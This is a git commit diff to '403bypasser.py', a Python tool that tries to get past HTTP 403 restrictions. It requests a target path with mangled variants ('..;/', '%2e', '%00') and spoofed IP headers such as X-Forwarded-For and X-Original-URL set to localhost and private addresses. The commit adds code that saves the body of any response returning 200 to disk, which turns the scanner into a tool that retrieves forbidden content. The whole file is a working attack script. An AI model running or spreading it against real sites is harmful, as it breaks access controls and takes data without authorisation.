12dbf017d9601ec797a4269477302dc25b00e31b
Tower450 <joe.tourangeau@gmail.com>
2026-04-22 18:43:54 -0400

    Add downloading files when status 200 HTTP OK and fix queries key to have domain_name and dir_key

--- 403bypasser.py
+++ 403bypasser.py
@@ -6,29 +6,57 @@ from pyfiglet import Figlet
 init()
 
 # DISPLAY BANNER -- START
-custom_fig = Figlet(font='slant')
-print(Fore.BLUE + Style.BRIGHT + custom_fig.renderText('-------------') + Style.RESET_ALL)
-print(Fore.BLUE + Style.BRIGHT + custom_fig.renderText('403bypasser') + Style.RESET_ALL)
-print(Fore.GREEN + Style.BRIGHT + "____________________ Yunus Emre SERT ____________________\n")
-print(Fore.LIGHTMAGENTA_EX + Style.BRIGHT + "-----> Twitter   : https://twitter.com/yunem_se\n")
+custom_fig = Figlet(font="slant")
+print(
+    Fore.BLUE + Style.BRIGHT + custom_fig.renderText("-------------") + Style.RESET_ALL
+)
+print(Fore.BLUE + Style.BRIGHT + custom_fig.renderText("403bypasser") + Style.RESET_ALL)
+print(
+    Fore.GREEN
+    + Style.BRIGHT
+    + "____________________ Yunus Emre SERT ____________________\n"
+)
+print(
+    Fore.LIGHTMAGENTA_EX
+    + Style.BRIGHT
+    + "-----> Twitter   : https://twitter.com/yunem_se\n"
+)
 print(Fore.MAGENTA + Style.BRIGHT + "-----> GitHub    : https://github.com/yunemse48\n")
-print(Fore.MAGENTA + Style.BRIGHT + "-----> LinkedIn  : https://www.linkedin.com/in/yunus-emre-sert-9102a9135/\n")
-print(Fore.BLUE + Style.BRIGHT + custom_fig.renderText('-------------') + Style.RESET_ALL)
+print(
+    Fore.MAGENTA
+    + Style.BRIGHT
+    + "-----> LinkedIn  : https://www.linkedin.com/in/yunus-emre-sert-9102a9135/\n"
+)
+print(
+    Fore.BLUE + Style.BRIGHT + custom_fig.renderText("-------------") + Style.RESET_ALL
+)
 # DISPLAY BANNER -- END
 
 # HANDLE ARGUMENTS -- START
 parser = argparse.ArgumentParser()
-parser.add_argument("-u", "--url", type=str, help="single URL to scan, ex: http://example.com")
-parser.add_argument("-U", "--urllist", type=str, help="path to list of URLs, ex: urllist.txt")
-parser.add_argument("-d", "--dir", type=str, help="Single directory to scan, ex: /admin", nargs="?", const="/")
-parser.add_argument("-D", "--dirlist", type=str, help="path to list of directories, ex: dirlist.txt")
+parser.add_argument(
+    "-u", "--url", type=str, help="single URL to scan, ex: http://example.com"
+)
+parser.add_argument(
+    "-U", "--urllist", type=str, help="path to list of URLs, ex: urllist.txt"
+)
+parser.add_argument(
+    "-d",
+    "--dir",
+    type=str,
+    help="Single directory to scan, ex: /admin",
+    nargs="?",
+    const="/",
+)
+parser.add_argument(
+    "-D", "--dirlist", type=str, help="path to list of directories, ex: dirlist.txt"
+)
 
 args = parser.parse_args()
 # HANDLE ARGUMENTS -- END
 
 
-
-class Arguments():
+class Arguments:
     def __init__(self, url, urllist, dir, dirlist):
         self.url = url
         self.urllist = urllist
@@ -36,122 +64,160 @@ class Arguments():
         self.dirlist = dirlist
         self.urls = []
         self.dirs = []
-        
+
         self.checkURL()
         self.checkDir()
-    
+
     def return_urls(self):
         return self.urls
-    
+
     def return_dirs(self):
         return self.dirs
-    
+
     def checkURL(self):
         if self.url:
             if not validators.url(self.url):
-                print("You must specify a valid URL for -u (--url) argument! Exitting...\n")
+                print(
+                    "You must specify a valid URL for -u (--url) argument! Exitting...\n"
+                )
                 sys.exit
-            
+
             if self.url.endswith("/"):
                 self.url = self.url.rstrip("/")
-            
+
             self.urls.append(self.url)
         elif self.urllist:
             if not os.path.exists(self.urllist):
                 print("The specified path to URL list does not exist! Exitting...\n")
                 sys.exit()
-            
-            with open(self.urllist, 'r') as file:
+
+            with open(self.urllist, "r") as file:
                 temp = file.readlines()
-            
+
             for x in temp:
                 self.urls.append(x.strip())
         else:
             print("Please provide a single URL or a list either! (-u or -U)\n")
             sys.exit()
-    
+
     def checkDir(self):
         if self.dir:
-            if not self.dir.startswith("/"): 
+            if not self.dir.startswith("/"):
                 self.dir = "/" + self.dir
-            
+
             if self.dir.endswith("/") and self.dir != "/":
                 self.dir = self.dir.rstrip("/")
             self.dirs.append(self.dir)
         elif self.dirlist:
             if not os.path.exists(self.dirlist):
-                print("The specified path to directory list does not exist! Exitting...\n")
+                print(
+                    "The specified path to directory list does not exist! Exitting...\n"
+                )
                 sys.exit()
-            
-            with open(self.dirlist, 'r') as file:
+
+            with open(self.dirlist, "r") as file:
                 temp = file.readlines()
-            
+
             for x in temp:
                 self.dirs.append(x.strip())
         else:
             self.dir = "/"
 
 
-class PathRepository():
+class PathRepository:
     def __init__(self, path):
         self.path = path
         self.newPaths = []
         self.newHeaders = []
         self.rewriteHeaders = []
-        
+
         self.createNewPaths()
         self.createNewHeaders()
-    
+
     def createNewPaths(self):
         self.newPaths.append(self.path)
-        
+
         pairs = [["/", "//"], ["/.", "/./"]]
-        
+
         leadings = ["/%2e"]
-        
-        trailings = ["/", "..;/", "/..;/", "%20", "%09", "%00", 
-                    ".json", ".css", ".html", "?", "??", "???", 
-                    "?testparam", "#", "#test", "/."]
-        
+
+        trailings = [
+            "/",
+            "..;/",
+            "/..;/",
+            "%20",
+            "%09",
+            "%00",
+            ".json",
+            ".css",
+            ".html",
+            "?",
+            "??",
+            "???",
+            "?testparam",
+            "#",
+            "#test",
+            "/.",
+        ]
+
         for pair in pairs:
             self.newPaths.append(pair[0] + self.path + pair[1])
-        
+
         for leading in leadings:
             self.newPaths.append(leading + self.path)
-        
+
         for trailing in trailings:
             self.newPaths.append(self.path + trailing)
-    
+
     def createNewHeaders(self):
         headers_overwrite = ["X-Original-URL", "X-Rewrite-URL"]
-        
-        headers = ["X-Custom-IP-Authorization", "X-Forwarded-For", 
-                "X-Forward-For", "X-Remote-IP", "X-Originating-IP", 
-                "X-Remote-Addr", "X-Client-IP", "X-Real-IP"]
-        
-        values = ["localhost", "localhost:80", "localhost:443", 
-                "127.0.0.1", "127.0.0.1:80", "127.0.0.1:443", 
-                "2130706433", "0x7F000001", "0177.0000.0000.0001", 
-                "0", "127.1", "10.0.0.0", "10.0.0.1", "172.16.0.0", 
-                "172.16.0.1", "192.168.1.0", "192.168.1.1"]
-        
+
+        headers = [
+            "X-Custom-IP-Authorization",
+            "X-Forwarded-For",
+            "X-Forward-For",
+            "X-Remote-IP",
+            "X-Originating-IP",
+            "X-Remote-Addr",
+            "X-Client-IP",
+            "X-Real-IP",
+        ]
+
+        values = [
+            "localhost",
+            "localhost:80",
+            "localhost:443",
+            "127.0.0.1",
+            "127.0.0.1:80",
+            "127.0.0.1:443",
+            "2130706433",
+            "0x7F000001",
+            "0177.0000.0000.0001",
+            "0",
+            "127.1",
+            "10.0.0.0",
+            "10.0.0.1",
+            "172.16.0.0",
+            "172.16.0.1",
+            "192.168.1.0",
+            "192.168.1.1",
+        ]
+
         for header in headers:
             for value in values:
-                self.newHeaders.append({header : value})
-        
+                self.newHeaders.append({header: value})
+
         for element in headers_overwrite:
-            self.rewriteHeaders.append({element : self.path})
+            self.rewriteHeaders.append({element: self.path})
 
 
-class Query():
+class Query:
     def __init__(self, url, dir, dirObject):
         self.url = url
-        self.dir = dir          # call pathrepo by this
+        self.dir = dir  # call pathrepo by this
         self.dirObject = dirObject
         self.domain = tldextract.extract(self.url).domain
-    
-    
-    
+
     def checkStatusCode(self, status_code):
         if status_code == 200 or status_code == 201:
             colour = Fore.GREEN + Style.BRIGHT
@@ -163,124 +229,171 @@ class Query():
             colour = Fore.RED + Style.BRIGHT
         else:
             colour = Fore.WHITE + Style.BRIGHT
-        
+
         return colour
-    
+
     def writeToFile(self, array):
         with open(self.domain + ".txt", "a") as file:
             for line in array:
                 file.write(line + "\n")
-    
+
     def manipulateRequest(self):
-        print((" Target URL: " + self.url + "\tTarget Path: " + self.dir + " ").center(121, "="))
+        print(
+            (" Target URL: " + self.url + "\tTarget Path: " + self.dir + " ").center(
+                121, "="
+            )
+        )
         results = []
         p = requests.post(self.url + self.dir, verify=False)
-        
+
         colour = self.checkStatusCode(p.status_code)
         reset = Style.RESET_ALL
-        
+
         line_width = 100
         target_address = "POST --> " + self.url + self.dir
         info = f"STATUS: {colour}{p.status_code}{reset}\tSIZE: {len(p.content)}"
         info_pure = f"STATUS: {p.status_code}\tSIZE: {len(p.content)}"
         remaining = line_width - len(target_address)
-        
+
         print("\n" + target_address + " " * remaining + info)
-        
+
         results.append(target_address + " " * remaining + info_pure)
-        
+
+        if p.status_code == 200:
+            safe_path = self.dir.replace("/", "_") if self.dir != "/" else "_rootPath"
+            filename = f"{self.domain}_{safe_path}.txt"
+            with open(filename, "wb") as f:  # use wb for binary safety
+                f.write(p.content)
+
         self.writeToFile(results)
-        
+
         self.manipulatePath()
-    
+
     def manipulatePath(self):
         results = []
         reset = Style.RESET_ALL
         line_width = 100
-        
+
         for path in self.dirObject.newPaths:
             r = requests.get(self.url + path, verify=False)
-            
+
             colour = self.checkStatusCode(r.status_code)
-            
+
             target_address = "GET --> " + self.url + path
             info = f"STATUS: {colour}{r.status_code}{reset}\tSIZE: {len(r.content)}"
             info_pure = f"STATUS: {r.status_code}\tSIZE: {len(r.content)}"
             remaining = line_width - len(target_address)
-            
+
             print(target_address + " " * remaining + info)
-            
+
+            if r.status_code == 200:
+                safe_path = path.replace("/", "_")
+                filename = f"{self.domain}_{safe_path}.txt"
+                with open(filename, "wb") as f:  # now filename exists
+                    f.write(r.content)
+
             results.append(target_address + " " * remaining + info_pure)
-        
+
         self.writeToFile(results)
         self.manipulateHeaders()
-    
+
     def manipulateHeaders(self):
         results = []
         line_width = 100
-        
+
         for header in self.dirObject.newHeaders:
             r = requests.get(self.url + self.dir, headers=header, verify=False)
-            
+
             colour = self.checkStatusCode(r.status_code)
             reset = Style.RESET_ALL
-            
+
             target_address = "GET --> " + self.url + self.dir
             info = f"STATUS: {colour}{r.status_code}{reset}\tSIZE: {len(r.content)}"
             info_pure = f"STATUS: {r.status_code}\tSIZE: {len(r.content)}"
             remaining = line_width - len(target_address)
-            
+
             print("\n" + target_address + " " * remaining + info)
             print(f"Header= {header}")
-            
-            results.append("\n" + target_address + " " * remaining + info_pure + f"\nHeader= {header}")
+
+            if r.status_code == 200:
+                safe_header = (
+                    "_".join(f"{k}-{v}" for k, v in header.items())
+                    .replace("/", "_")
+                    .replace(" ", "_")
+                )
+                filename = f"{self.domain}_{self.dir.strip('/').replace('/', '_')}_{safe_header}.txt"
+                with open(filename, "wb") as f:
+                    f.write(r.content)
+
+            results.append(
+                "\n"
+                + target_address
+                + " " * remaining
+                + info_pure
+                + f"\nHeader= {header}"
+            )
         self.writeToFile(results)
-        
+
         results_2 = []
         for header in self.dirObject.rewriteHeaders:
-            r = requests.get(self.url, headers=header, verify=False)
-            
+            r = requests.get(
+                self.url, headers=header, allow_redirects=False, verify=False
+            )
+
             colour = self.checkStatusCode(r.status_code)
             reset = Style.RESET_ALL
-            
+
             target_address = "GET --> " + self.url
             info = f"STATUS: {colour}{r.status_code}{reset}\tSIZE: {len(r.content)}"
             info_pure = f"STATUS: {r.status_code}\tSIZE: {len(r.content)}"
             remaining = line_width - len(target_address)
-            
+
             print("\n" + target_address + " " * remaining + info)
             print(f"Header= {header}")
-            
-            results_2.append("\n" + target_address + " " * remaining + info_pure + f"\nHeader= {header}")
-        
+
+            if r.status_code == 200:
+                safe_header = (
+                    "_".join(f"{k}-{v}" for k, v in header.items())
+                    .replace("/", "_")
+                    .replace(" ", "_")
+                )
+                filename = f"{self.domain}_{self.dir.strip('/').replace('/', '_')}_{safe_header}.txt"
+                with open(filename, "wb") as f:
+                    f.write(r.content)
+            results_2.append(
+                "\n"
+                + target_address
+                + " " * remaining
+                + info_pure
+                + f"\nHeader= {header}"
+            )
+
         self.writeToFile(results_2)
 
 
-class Program():
+class Program:
     def __init__(self, urllist, dirlist):
         self.urllist = urllist
         self.dirlist = dirlist
-    
+
     def initialise(self):
-        path_objects = {}  # Store PathRepository objects here
-        query_objects = {} # Store Query objects here
+        paths = {}  # store PathRepository objects
+        queries = {}  # store Query objects
 
         for u in self.urllist:
             for d in self.dirlist:
-                # 1. Create a safe key for the directory
-                dir_key = d if d != "/" else "_rootPath"
-
+                # 1. Create a safe key from the directory
+                dir_key = d.lstrip("/").replace("/", "_") if d != "/" else "_rootPath"
                 # 2. Store the PathRepository in our dict
-                path_objects[dir_key] = PathRepository(d)
-
+                paths[dir_key] = PathRepository(d)
                 # 3. Extract domain for the query key
                 domain_name = tldextract.extract(u).domain
-
                 # 4. Initialize Query using our dicts instead of locals()
-                query_objects[domain_name] = Query(u, d, path_objects[dir_key])
+                query_key = f"{domain_name}_{dir_key}"
+                queries[query_key] = Query(u, d, paths[dir_key])
 
                 # 5. Run the logic
-                query_objects[domain_name].manipulateRequest()
+                queries[query_key].manipulateRequest()
 
 argument = Arguments(args.url, args.urllist, args.dir, args.dirlist)
 program = Program(argument.return_urls(), argument.return_dirs())
